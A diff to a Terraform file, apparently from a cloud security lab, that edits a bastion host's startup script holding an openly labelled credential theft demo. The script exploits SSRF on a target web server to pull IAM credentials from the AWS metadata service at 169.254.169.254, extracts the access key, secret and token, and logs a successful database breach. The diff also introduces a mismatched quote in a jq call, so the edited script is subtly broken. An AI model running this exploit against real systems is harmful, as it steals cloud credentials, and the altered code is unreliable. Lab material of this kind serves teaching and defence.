@@ -616,30 +616,30 @@ resource "aws_instance" "bastion" {
     #!/bin/bash
     echo "=== IMDSv1 Credential Theft Demo ==="
     echo ""
-    echo "Target Web Server: ${1:-http://10.0.1.100:8080}"
+    echo "Target Web Server: $${1:-http://10.0.1.100:8080}"
     echo ""
     echo "Step 1: Exploiting SSRF to access IMDS..."
     echo "----------------------------------------"
     
-    TARGET="${1:-http://10.0.1.100:8080}"
+    TARGET="$${1:-http://10.0.1.100:8080}"
     
     # Get IAM role name
     echo "Getting IAM role name..."
-    ROLE=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+    ROLE=$$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
     echo "Found role: $ROLE"
     echo ""
     
     # Get credentials
     echo "Stealing credentials..."
-    CREDS=$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
+    CREDS=$$(curl -s "$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
     echo "Raw credentials response:"
-    echo "$CREDS" | jq '.'
+    echo "$CREDS" | jq ".'
     echo ""
     
     # Parse credentials
-    ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId')
-    SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
-    SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
+    ACCESS_KEY=$$(echo "$CREDS" | jq -r '.AccessKeyId')
+    SECRET_KEY=$$(echo "$CREDS" | jq -r '.SecretAccessKey')
+    SESSION_TOKEN=$$(echo "$CREDS" | jq -r '.Token')
     
     echo "Step 2: Using stolen credentials"
     echo "--------------------------------"
@@ -658,7 +658,7 @@ resource "aws_instance" "bastion" {
     echo "Success! We've stolen the credentials and accessed the database!"
     
     # Log the attack for CloudWatch
-    echo "[$(date)] Attack completed - Credentials stolen and database accessed" >> /home/ec2-user/attack.log
+    echo "[$$(date)] Attack completed - Credentials stolen and database accessed" >> /home/ec2-user/attack.log
     SCRIPT
     
     chmod +x /home/ec2-user/steal-creds.sh
@@ -666,9 +666,9 @@ resource "aws_instance" "bastion" {
     # Create wrapper script that logs attacks
     cat > /home/ec2-user/run-attack.sh <<'WRAPPER'
     #!/bin/bash
-    echo "[$(date)] Starting credential theft attack from $(whoami)" >> /home/ec2-user/attack.log
-    ./steal-creds.sh "$@" 2>&1 | tee -a /home/ec2-user/attack.log
-    echo "[$(date)] Attack script completed" >> /home/ec2-user/attack.log
+    echo "[$$(date)] Starting credential theft attack from $$(whoami)" >> /home/ec2-user/attack.log
+    ./steal-creds.sh "$$@" 2>&1 | tee -a /home/ec2-user/attack.log
+    echo "[$$(date)] Attack script completed" >> /home/ec2-user/attack.log
     WRAPPER
     
     chmod +x /home/ec2-user/run-attack.sh
